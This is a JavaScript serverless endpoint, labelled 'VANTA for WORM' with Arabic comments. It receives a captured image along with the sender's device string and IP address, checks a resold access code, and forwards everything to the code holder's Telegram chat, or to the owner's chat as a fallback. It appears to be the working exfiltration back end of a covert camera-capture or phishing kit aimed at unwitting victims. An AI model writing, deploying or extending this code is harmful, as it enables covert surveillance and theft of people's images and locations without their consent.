// api/send.js — VANTA for WORM
// يستقبل الصورة، يتحقق من الرمز، يرسلها لصاحب الرمز

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.status(405).json({ ok: false });
    return;
  }

  const TG_TOKEN = process.env.TG_TOKEN;
  const CONFIG_URL = process.env.GLOBAL_CONFIG;
  const FALLBACK_CHAT = process.env.TG_CHAT;

  if (!TG_TOKEN) {
    res.status(500).json({ ok: false, err: 'no token' });
    return;
  }

  try {
    let body = req.body;
    if (typeof body === 'string') body = JSON.parse(body);

    const image  = body && body.image;
    const device = (body && body.device) ? String(body.device).slice(0, 200) : 'غير معروف';
    const code   = (body && body.code) ? String(body.code).toUpperCase().replace(/[^A-Z0-9]/g,'') : '';

    const m = /^data:image\/(png|jpeg|webp);base64,([A-Za-z0-9+/=]+)$/.exec(image || '');
    if (!m) {
      res.status(400).json({ ok: false, err: 'bad image' });
      return;
    }

    const buf = Buffer.from(m[2], 'base64');
    const ip  = ((req.headers['x-forwarded-for'] || '').split(',')[0].trim())
                || req.socket?.remoteAddress || 'unknown';
    const cap = new Date().toISOString();

    // تحديد المستلم
    let recipient = null;

    if (code && CONFIG_URL) {
      try {
        const r = await fetch(CONFIG_URL);
        const cfg = await r.json();
        const codes = cfg.codes || {};
        const entry = codes[code];
        if (entry && entry.usedBy) {
          recipient = entry.usedBy;
        }
      } catch (e) {}
    }

    // إذا لا يوجد رمز صحيح، أرسل للمالك (fallback)
    if (!recipient) {
      recipient = FALLBACK_CHAT;
    }

    if (!recipient) {
      res.status(400).json({ ok: false, err: 'no recipient' });
      return;
    }

    const caption =
      '📸 صورة جديدة\n' +
      (code ? '🔑 الرمز: ' + code + '\n' : '') +
      '📱 ' + device + '\n' +
      '🌐 IP: ' + ip + '\n' +
      '🕐 ' + cap;

    const boundary = '----vanta' + Date.now();
    const head = `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${recipient}\r\n` +
                 `--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n` +
                 `--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="cap.jpg"\r\nContent-Type: image/jpeg\r\n\r\n`;
    const tail = `\r\n--${boundary}--\r\n`;
    const payload = Buffer.concat([Buffer.from(head, 'utf8'), buf, Buffer.from(tail, 'utf8')]);

    const tg = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
      method: 'POST',
      headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` },
      body: payload
    });

    const out = await tg.json();
    res.status(200).json({ ok: !!out.ok });
  } catch (e) {
    res.status(500).json({ ok: false, err: String(e) });
  }
}
